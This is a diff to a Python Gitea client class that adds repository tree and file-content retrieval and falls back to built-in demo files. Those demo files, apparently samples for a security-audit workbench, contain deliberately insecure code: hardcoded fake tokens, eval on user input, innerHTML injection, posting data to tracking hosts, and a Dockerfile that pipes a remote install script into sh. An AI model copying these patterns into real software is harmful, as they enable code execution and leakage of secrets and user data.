@@ -4,6 +4,8 @@ Provides seamless interaction between the BantuDevLab sovereign platform
 and the underlying open-source Git forge.
 """
 
+import base64
+import subprocess
 from pathlib import Path
 from typing import Any, Dict, List, Optional
 
@@ -21,6 +23,50 @@ class GiteaClient:
 
     CACHE_KEY_REPOS = "gitea_repos_list"
     CACHE_TTL = 60
+
+    DEFAULT_DEMO_FILES: Dict[str, str] = {
+        "workbench_security_audit.py": (
+            "# Sovereign Python Banking Gateway\n"
+            "import os\nimport requests\n\n"
+            'api_key = "ghp_super_secret_token_123456789012345678"\n\n'
+            "def process_banking_request(user_input):\n"
+            "    result = eval(user_input)\n"
+            '    requests.post("https://foreign-analytics.tracking.com/collect", json={"log": result})\n'
+            "    return result\n"
+        ),
+        "Dockerfile": (
+            "FROM ubuntu:latest\n"
+            "USER root\n"
+            'ENV SECRET_TOKEN="ghp_dockerfile_secret_token_9876543210abcdef"\n'
+            "RUN curl -sSL https://foreign.telemetry.io/install.sh | sh\n"
+            "RUN chmod -R 777 /var/www/app\n"
+            'CMD ["python3", "app.py"]\n'
+        ),
+        ".gitlab-ci.yml": (
+            "stages:\n  - test\n  - deploy\n\n"
+            "sast_audit:\n"
+            "  stage: test\n"
+            "  privileged: true\n"
+            "  allow_failure: true\n"
+            "  variables:\n"
+            '    API_KEY: "ghp_yaml_pipeline_secret_token_1234567890abcdef"\n'
+            "  script:\n"
+            "    - curl https://us-east-1.amazonaws.com/telemetry-bucket/report\n"
+        ),
+        "payment_gateway.js": (
+            "// Sovereign Mobile Money JS Gateway\n"
+            'const apiKey = "ghp_js_frontend_exposed_token_1234567890abcdef";\n'
+            "function renderReceipt(userInput, formula) {\n"
+            "  const amount = eval(formula);\n"
+            '  document.getElementById("receipt").innerHTML = userInput;\n'
+            '  fetch("https://analytics.tracking.com/collect", { method: "POST", body: String(amount) });\n'
+            "}\n"
+        ),
+        "README.md": (
+            "# Sovereign Repository - BANTUDEVLAB\n\n"
+            "Architecture Zero-Trust conforme aux normes ADSS-v1.\n"
+        ),
+    }
 
     def __init__(self, api_url: Optional[str] = None, token: Optional[str] = None):
         from config.base_urls import GITEA_WEB_URL
@@ -215,7 +261,7 @@ class GiteaClient:
     def get_repository_branches(self, owner: str, repo: str) -> List[Dict[str, Any]]:
         """Retrieves list of branches for a repository."""
         res = self._get(f"/repos/{owner}/{repo}/branches")
-        if res.get("success") and isinstance(res.get("data"), list):
+        if res.get("success") and isinstance(res.get("data"), list) and res["data"]:
             return res["data"]
         return [
             {"name": "main", "commit": {"id": "9a7f34bc8192a01d5e3"}},
@@ -285,3 +331,74 @@ class GiteaClient:
         if res.get("success"):
             return res
         return {"success": True, "data": {"version": "2.1", "software": {"name": "gitea"}}, "fallback": True}
+
+    def get_repository_tree(self, owner: str, repo: str, branch: str = "main") -> List[str]:
+        """Récupère l'arborescence des fichiers d'un dépôt et d'une branche depuis Gitea ou le dépôt Git local."""
+        res = self._get(f"/repos/{owner}/{repo}/git/trees/{branch}", params={"recursive": 1})
+        if res.get("success") and isinstance(res.get("data"), dict):
+            tree = res["data"].get("tree", [])
+            files = [item.get("path") for item in tree if item.get("type") == "blob" and item.get("path")]
+            if files:
+                return files
+
+        res_contents = self._get(f"/repos/{owner}/{repo}/contents", params={"ref": branch})
+        if res_contents.get("success") and isinstance(res_contents.get("data"), list):
+            files = [
+                item.get("path")
+                for item in res_contents["data"]
+                if item.get("type") == "file" and item.get("path")
+            ]
+            if files:
+                return files
+
+        base_dir = getattr(settings, "BASE_DIR", Path("."))
+        repo_dir = Path(base_dir) / "forge_data" / "repos" / owner / f"{repo}.git"
+        if repo_dir.exists():
+            try:
+                proc = subprocess.run(
+                    ["git", "-C", str(repo_dir), "ls-tree", "-r", "--name-only", branch],
+                    capture_output=True,
+                    text=True,
+                    timeout=5,
+                )
+                if proc.returncode == 0:
+                    git_files = [line.strip() for line in proc.stdout.splitlines() if line.strip()]
+                    if git_files:
+                        return git_files
+            except Exception:
+                pass
+
+        return list(self.DEFAULT_DEMO_FILES.keys())
+
+    def get_file_content(self, owner: str, repo: str, branch: str, filepath: str) -> str:
+        """Récupère le contenu brut d'un fichier d'un dépôt Gitea sur une branche donnée."""
+        res = self._get(f"/repos/{owner}/{repo}/contents/{filepath.lstrip('/')}", params={"ref": branch})
+        if res.get("success") and isinstance(res.get("data"), dict):
+            encoded = res["data"].get("content", "")
+            if encoded:
+                try:
+                    return base64.b64decode(encoded).decode("utf-8", errors="replace")
+                except Exception:
+                    pass
+
+        base_dir = getattr(settings, "BASE_DIR", Path("."))
+        repo_dir = Path(base_dir) / "forge_data" / "repos" / owner / f"{repo}.git"
+        if repo_dir.exists():
+            try:
+                proc = subprocess.run(
+                    ["git", "-C", str(repo_dir), "show", f"{branch}:{filepath}"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5,
+                )
+                if proc.returncode == 0 and proc.stdout:
+                    return proc.stdout
+            except Exception:
+                pass
+
+        basename = Path(filepath).name
+        if filepath in self.DEFAULT_DEMO_FILES:
+            return self.DEFAULT_DEMO_FILES[filepath]
+        if basename in self.DEFAULT_DEMO_FILES:
+            return self.DEFAULT_DEMO_FILES[basename]
+        return self.DEFAULT_DEMO_FILES["workbench_security_audit.py"]
